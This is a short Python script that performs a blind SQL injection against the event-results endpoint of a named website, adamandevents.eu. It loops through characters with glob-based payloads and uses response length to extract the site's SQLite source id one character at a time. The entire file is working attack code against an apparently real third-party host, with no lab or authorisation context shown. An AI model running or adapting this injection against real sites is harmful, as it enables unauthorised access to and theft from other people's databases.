import requests

alph = "023456789.:-abcdef 1"
#https://www.adamandevents.eu/src/ajax_uitslag.php?event=' OR  '1' AND (SELECT coalesce((select glob('3*', (select sqlite_version()))),'1') ) OR '

BASE_URL = "https://www.adamandevents.eu/src/ajax_uitslag.php?event="
payload  = "' OR  '1' AND (SELECT coalesce((select glob('{}*', (select sqlite_source_id()))),'1')) OR '"
fullstr  = ""
change   = True

while True:
    if not change:
        print(f"The DBMS version is: {fullstr}")
        exit(0)
    print(fullstr)
    change = False
    for char in alph:
        curr_payload = payload.format(fullstr+char)
        url = BASE_URL+curr_payload
        r = requests.get(url)
        #print(curr_payload)
        #print(f"char: {char}, length: {len(r.text)}")
        if len(r.text) > 1000:
            fullstr+=char
            change = True
            break
